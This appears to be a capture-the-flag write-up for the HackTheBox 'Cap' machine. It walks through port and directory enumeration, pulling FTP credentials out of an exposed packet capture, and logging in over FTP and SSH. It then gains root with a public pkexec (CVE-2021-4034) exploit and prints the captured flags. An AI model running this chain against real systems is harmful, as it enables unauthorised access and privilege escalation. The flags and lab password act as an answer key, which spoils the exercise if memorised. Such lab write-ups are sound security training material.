# CAP Machine

# Enumeration 

Starting with nmap:

```shell
nmap -sC -sV -Pn 10.129.6.130 -o nmap.txt                                                                                          1   main 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-27 20:07 CEST
Nmap scan report for 10.129.6.130
Host is up (0.036s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Thu, 27 Oct 2022 18:07:24 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Thu, 27 Oct 2022 18:07:19 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Thu, 27 Oct 2022 18:07:19 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=10/27%Time=635AC8D7%P=x86_64-pc-linux-gnu%r(Get
SF:Request,2F31,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x2
SF:0Thu,\x2027\x20Oct\x202022\x2018:07:19\x20GMT\r\nConnection:\x20close\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2019
SF:386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\">
SF:\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x
SF:20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20
SF:\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<meta
SF:\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale
SF:=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"imag
SF:e/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x20
SF:<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\"
SF:>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/fo
SF:nt-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x2
SF:0href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20rel
SF:=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min\
SF:.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/
SF:css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOptio
SF:ns,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Thu,\x
SF:2027\x20Oct\x202022\x2018:07:19\x20GMT\r\nConnection:\x20close\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\
SF:x20GET\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20tex
SF:t/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x2
SF:0\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body>
SF:\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inval
SF:id\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTS
SF:P/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,18
SF:9,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20
SF:Thu,\x2027\x20Oct\x202022\x2018:07:24\x20GMT\r\nConnection:\x20close\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232
SF:\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x2
SF:0Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1
SF:>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20se
SF:rver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20c
SF:heck\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.02 seconds

```

As usual, lets run gobuster dir:
```shell
gobuster dir --url http://10.129.6.130 --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -o gobuster.txt main 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.6.130
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/27 21:00:18 Starting gobuster in directory enumeration mode
===============================================================
/data                 (Status: 302) [Size: 208] [--> http://10.129.6.130/]
/ip                   (Status: 200) [Size: 17449]
/netstat              (Status: 200) [Size: 28502]
/capture              (Status: 302) [Size: 220] [--> http://10.129.6.130/data/3]
Progress: 87657 / 87665 (99.99%)===============================================================
2022/10/27 21:05:55 Finished
===============================================================
```

Let's take a look with whatweb:

```shell
whatweb 10.129.7.133 --log-brief=whatweb.log
http://10.129.7.133 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.129.7.133], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]
```

Open site with browser:
![home](IMG/home.png)

Let's take a look on "Security Snapshot (5 Second PCAP + Analysis)" section, after refreshing this we found that the url changes from 0 to 9 : http://10.129.7.133/data/[0-9]

![webcap](IMG/webcap.png)

After check all pcap files, ftp user and password on /0:

```shell
tshark -Vr 0.pcap |egrep "USER|PASS"
egrep: warning: egrep is obsolescent; using grep -E
    USER nathan\r\n
        Request command: USER
    PASS Buck3tH4TF0RM3!\r\n
        Request command: PASS
```

Lets go to ftp login: 

```shell
ftp nathan@10.129.7.133                                                                                                                     main 
Connected to 10.129.7.133.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Oct 29 16:55 user.txt
226 Directory send OK.
ftp> mget user.txt
mget user.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.000967 seconds (33.3 kbytes/s)
ftp> quit
221 Goodbye.
```

Lets take a look on user.txt file:

```shell
cat user.txt                                                                                                                                  main 
ec71dbbab76b04b28543dc0328ec952b
```

After get user flag, lets go ssh login and try escpriv:

```shell

ssh nathan@10.129.7.133                                                                                                                       main 
nathan@10.129.7.133's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Oct 29 19:46:34 UTC 2022

  System load:           0.0
  Usage of /:            36.9% of 8.73GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.7.133
  IPv6 address for eth0: dead:beef::250:56ff:fe96:6fc9

  => There are 2 zombie processes.


63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$ 
```

Check sudo privilegies:
```shell
nathan@cap:~$ sudo -l
[sudo] password for nathan: 
Sorry, user nathan may not run sudo on cap.
nathan@cap:~$ 
```

Find suid files:
```shell
nathan@cap:~$     find / -perm -u=s -type f 2>/dev/null
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/chsh
/usr/bin/su
/usr/bin/fusermount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/snap/snapd/11841/usr/lib/snapd/snap-confine
/snap/snapd/12398/usr/lib/snapd/snap-confine
/snap/core18/2066/bin/mount
/snap/core18/2066/bin/ping
/snap/core18/2066/bin/su
/snap/core18/2066/bin/umount
/snap/core18/2066/usr/bin/chfn
/snap/core18/2066/usr/bin/chsh
/snap/core18/2066/usr/bin/gpasswd
/snap/core18/2066/usr/bin/newgrp
/snap/core18/2066/usr/bin/passwd
/snap/core18/2066/usr/bin/sudo
/snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2066/usr/lib/openssh/ssh-keysign
/snap/core18/2074/bin/mount
/snap/core18/2074/bin/ping
/snap/core18/2074/bin/su
/snap/core18/2074/bin/umount
/snap/core18/2074/usr/bin/chfn
/snap/core18/2074/usr/bin/chsh
/snap/core18/2074/usr/bin/gpasswd
/snap/core18/2074/usr/bin/newgrp
/snap/core18/2074/usr/bin/passwd
/snap/core18/2074/usr/bin/sudo
/snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2074/usr/lib/openssh/ssh-keysign
nathan@cap:~$ 
```

Interesting pxec, after some gg search I found [pkexec](https://github.com/Almorabea/pkexec-exploit) exploit:


```shell
nathan@cap:~$ python3 ./CVE-2021-4034.py 
Do you want to choose a custom payload? y/n (n use default payload)  
[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7ff262505000 at 0x7ff262029730>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
# ls  
# cd /root
# ls
root.txt  snap
# cat root.txt
baee1036dbb2e55abc682c3fee1bff0c
# 
```
